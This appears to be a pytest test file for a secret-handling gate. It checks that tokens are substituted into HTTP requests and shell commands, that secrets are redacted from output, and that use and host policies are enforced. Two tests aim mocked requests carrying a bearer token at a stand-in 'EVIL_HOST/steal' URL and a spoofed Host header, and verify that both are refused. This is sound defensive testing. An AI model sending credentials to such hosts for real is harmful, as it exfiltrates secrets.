import subprocess

import httpx
import pytest
import respx

from secret_gate.constants import USE_EXEC
from secret_gate.errors import PolicyViolation, ValidationError
from secret_gate.gate_ops import op_describe, op_exec, op_http, op_otp
from secret_gate.otp import totp
from tests.conftest import FIXED_TIME
from tests.fixtures import fake_secrets as fs


def test_op_otp_and_describe(resolver, portal_totp, portal_pass):
    assert op_otp(resolver, portal_totp) == totp(fs.TOTP_SECRET_B32, at=FIXED_TIME)
    assert op_describe(resolver, portal_pass)["label"] == fs.PORTAL.label


@respx.mock
def test_op_http_substitutes_and_redacts(resolver, api_bearer):
    route = respx.get("https://api.c.example.org/me").mock(
        return_value=httpx.Response(200, json={"token_echo": fs.API_BEARER.password, "ok": True})
    )
    result = op_http(resolver, method="get", url="https://api.c.example.org/me",
                     headers={"Authorization": f"Bearer {api_bearer}"})
    sent = route.calls.last.request
    assert sent.headers["Authorization"] == f"Bearer {fs.API_BEARER.password}"
    assert result.status == 200
    assert fs.API_BEARER.password not in result.body
    assert "[REDACTED:api-c/token]" in result.body


@respx.mock
def test_op_http_wrong_host_denied(resolver, api_bearer):
    respx.get(f"https://{fs.EVIL_HOST}/steal").mock(return_value=httpx.Response(200))
    with pytest.raises(PolicyViolation):
        op_http(resolver, method="GET", url=f"https://{fs.EVIL_HOST}/steal",
                headers={"Authorization": f"Bearer {api_bearer}"})
    assert not respx.calls  # nothing left the gate


@respx.mock
def test_op_http_body_and_url(resolver, portal_pass, portal_user):
    route = respx.post("https://portal-a.example.com/login").mock(return_value=httpx.Response(302, headers={"Location": "/home"}))
    result = op_http(resolver, method="POST", url=f"https://portal-a.example.com/login?u={portal_user}",
                     body=f"password={portal_pass}")
    req = route.calls.last.request
    assert req.url.params["u"] == fs.PORTAL.username
    assert req.content.decode() == f"password={fs.PORTAL.password}"
    assert result.status == 302 and result.headers["location"] == "/home"


@respx.mock
def test_op_http_refuses_a_host_header_for_another_site(resolver, api_bearer):
    respx.get("https://api.c.example.org/me").mock(return_value=httpx.Response(200))
    with pytest.raises(ValidationError, match="Host header"):
        op_http(resolver, method="GET", url="https://api.c.example.org/me",
                headers={"Host": fs.EVIL_HOST, "Authorization": f"Bearer {api_bearer}"})
    assert not respx.calls
    op_http(resolver, method="GET", url="https://api.c.example.org/me", headers={"host": "API.c.example.org:443"})


def test_op_http_validation(resolver):
    with pytest.raises(ValidationError):
        op_http(resolver, method="BREW", url="https://a.com")
    with pytest.raises(ValidationError):
        op_http(resolver, method="GET", url="/relative")


def _exec(resolver, token, argv, **kw):
    return op_exec(lambda t: resolver.resolve_exact(t, use=USE_EXEC), argv=argv, env={"PW": token}, **kw)


def test_op_exec_redacts_output(resolver, db_pass):
    result = _exec(resolver, db_pass, ["/bin/sh", "-c", 'printf "pw=%s %s" "$PW" "$0"', "x"])
    assert result.returncode == 0
    assert fs.DB.password not in result.stdout
    assert result.stdout == "pw=[REDACTED:db-d/pass] x"


def test_op_exec_use_policy(resolver, portal_pass):
    with pytest.raises(PolicyViolation):
        _exec(resolver, portal_pass, ["echo"])


def test_op_exec_custom_runner(resolver, db_pass):
    seen = {}

    def runner(argv, **kw):
        seen["argv"], seen["env"] = argv, kw["env"]
        return subprocess.CompletedProcess(argv, 3, stdout="", stderr=f"bad {fs.DB.password}")

    result = _exec(resolver, db_pass, ["prog"], runner=runner)
    assert seen["argv"] == ["prog"] and seen["env"]["PW"] == fs.DB.password
    assert result.returncode == 3 and result.stderr == "bad [REDACTED:db-d/pass]"


